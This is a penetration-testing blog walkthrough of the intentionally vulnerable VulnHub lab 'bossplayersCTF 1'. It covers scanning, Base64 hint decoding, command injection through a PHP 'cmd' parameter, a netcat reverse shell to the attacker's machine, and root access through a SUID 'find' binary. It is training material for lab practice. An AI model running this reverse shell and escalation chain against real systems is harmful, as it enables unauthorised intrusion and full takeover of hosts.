@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">bossplayersCTF 1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-09T05:24:09+00:00">October 9, 2019</time><time class="updated" datetime="2025-06-10T20:30:48+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">bossplayersCTF 1 VM is made by Cuong Nguyen. This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of intermediate level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to get root and to read the root flag.</span></p>
+<p><span style="color: #000000;">Level: Intermediate</span></p>
+<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/bossplayersctf-1,375/">link</a>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap port scan</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
+<li><span style="color: #000000;">Decoding Encoded Text</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Command Injection</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SUID on find command</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Capture the flag</strong></span></p>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">The first step to attack is to identify the target. So, identify your target. To identify the target, we will use the following command:</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VHsvd-HZoBo/XZ1rqz5xPnI/AAAAAAAAg4M/_D2WaNClQFoix3e71KoeDx1EhommgRjTACLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.107</pre>
+<p><span style="color: #000000;">We learned from the scan that we have the port 80 open which is hosting Rocket httpd service, and we have the port 22 open. This tells us that we also have the OpenSSH service running on the target machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-MC1SuP6tklg/XZ1rsJcLbSI/AAAAAAAAg4c/3PhPv_tAflcK0wB81IAPZOorYQ1Dh4iMQCLcBGAsYHQ/s1600/3.png"/></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore we navigated to a web browser for exploring HTTP service. Here we have the description of the machine that tells us that this is an extremely easy CTF. It is for those who are getting started with the CTFs. It also tells us that there might be rabbit holes. So we will try to avoid those.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PgrwiX3UxAk/XZ1rsolgTkI/AAAAAAAAg4g/LwKFAksIoZAthCPfwrbVC7UcXccxFcuFACLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">Now as the convention, we checked the source code of the webpage in the hope to get some valuable hint to move forward with our enumeration. Here, we got an encoded value. This might lead us somewhere.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wU0FooJlCeY/XZ1rtA3GcXI/AAAAAAAAg4k/b141fkFz8eImxenxwCcGbY4JK2nKE_9HACLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">But we wanted to further enumerate with a directory bruteforce. To do this we will use the dirb. With this directory bruteforce scan, we got a robots.txt file. On browsing it on our web browser we see that we have another encoded text titled as super-secret password. We decoded it to find a troll message “lol try harder bro”. This might be the rabbit hole mentioned earlier. </span></p>
+<pre class="lang:default decode:true">drib http://192.168.1.107/</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-66qGqwwKfuc/XZ1rtgKO_PI/AAAAAAAAg4o/_kPXUQ6y4SkhCskIIel7YSzSiHd6VrfSgCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">We went back to the commented encoded text we found earlier in the Source code of the webpage. It seemed like Base64, so we tried to decode it using base64 command. It gave back another encoded text. This also seemed like Base64, so we decoded it again. This gave back another encoded text. This is getting really tiring. Now we decoded it again to find workinginprogress.php. Not this seems important. All those decodings were not gone for waste.</span></p>
+<pre class="lang:default decode:true">echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
+ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
+echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
+d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
+echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Igj9aNM8OAk/XZ1ruAo34NI/AAAAAAAAg4s/3sBjKiueo5ImK4hopl96BQX_ifwg-q1ygCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">We tried to open this file on our Web Browser as shown in the image given below. It was a checklist of some kind. It showed that Linux Debian is installed, Apache2 is installed and PHP is also installed. But the stuff that’s not completed tests the ping command and fix the privilege escalation. These seem like major hints.  </span></p>
+<pre class="lang:default decode:true">http://192.168.1.107/workinginprogress.php</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LZDCFlMHKII/XZ1ruj8SP2I/AAAAAAAAg4w/khQiNGwH_B8hbL0bgsJAbvlM1TwIWKqKACLcBGAsYHQ/s1600/8.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
+<p><span style="color: #000000;">As it said to test the ping command, it got us thinking that this might, in fact, be command injection. To further inspect this suspicion, we tried to run the id command through the URL as shown in the image given below. This made our suspicion true. This, in fact, is Command Injection.  </span></p>
+<pre class="lang:default decode:true">http://192.168.1.107/workinginprogress.php?cmd=id</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8c_jm7PYvu0/XZ1ru0kikkI/AAAAAAAAg40/SrHCux5ScnwfiTco771xNu5s075bC5qywCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">To exploit command injection, we will be using the netcat invoke shell one-liner. Before running that we need a netcat listener to receive the shell that is going to be invoked.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;">After running the listener, we went back to our browser, and here instead of the id command that we ran previously, it was time to run the shell invocation command. Here we invoked bin/bash shell to the IP Address 192.168.1.105 [Kali Linux]. With the port that we started the listener with.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.107/workinginprogress.php?cmd=nc -e /bin/bash 192.168.1.105 1234</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-2qmaVnuHft4/XZ1rqwNzNWI/AAAAAAAAg4U/BbMwQzaqnwshiZA9ZzY3AnJJQhUncJUYgCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">Now, we went back to our terminal, where we ran the netcat listener. We see that we have successfully got a session. But the shell that came with the session is an improper one. So in order to convert it into a proper shell, we ran the python one-liner. This gave us a proper shell. As soon as we got this shell, we saw that the session that we got is of user www-data. This means that this is an unprivileged shell. We will have to work out a way to that elevated privilege shell. For this, we start to enumerate the target machine through the shell we got.</span></p>
+<pre class="lang:default decode:true ">python -c 'import pty;pty.spawn("/bin/bash")'
+find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">As a part of our enumeration procedure, we ran the find command with -perm parameter to search for any file having SUID permissions. The find command itself has this permission. This made our job a little easy.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-e78FQ0mxYaM/XZ1rq-SyCQI/AAAAAAAAg4Q/5yEBgWiI_WQz2EiQyxsUlAmV7LnywND6gCLcBGAsYHQ/s1600/11.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We ran the find command and tried to invoke the /bin/sh shell using it as shown in the image given below. This gave back us a root shell. We confirmed this is a root shell by running the id command.</span></p>
+<pre class="lang:default decode:true">find . -exec /bin/sh -p \; -quit 
+id 
+cd /root 
+ls 
+cat root.txt</pre>
+<p><span style="color: #000000;">Now we wanted to enumerate for the Root Flag. We went into the home directory of the root user. Here we found the file named root.txt. On opening it we got a base64 encoded text. It said “congratulations”. This concludes this CTF Challenge.</span></p>
+<p><span style="color: #000000;"><strong><span style="color: #000000;">NOTE: Here we ran typed the command as simply we enter. The shell however just prints what we type again with it. So it gave the look as shown in the image.</span> </strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-o6Y47DxahsE/XZ1rrk2ZA1I/AAAAAAAAg4Y/ITXhxZEmxT0ILOq9beBHTvvshc3n4IzaQCLcBGAsYHQ/s1600/12.png"/></p>
+<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/chronos-vulnhub-walkthrough/" title="Chronos Vulnhub Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Chronos Vulnhub Walkthrough</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/digital-world-local-vengeance-vulnhub-walkthrough/" title="digital world.local: Vengeance Vulnhub Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">digital world.local: Vengeance Vulnhub Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/" rel="prev">Misdirection 1: Vulnhub Walkthrough</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" rel="next">Lxd Privilege Escalation</a></div></div>
+	</nav>        </div>
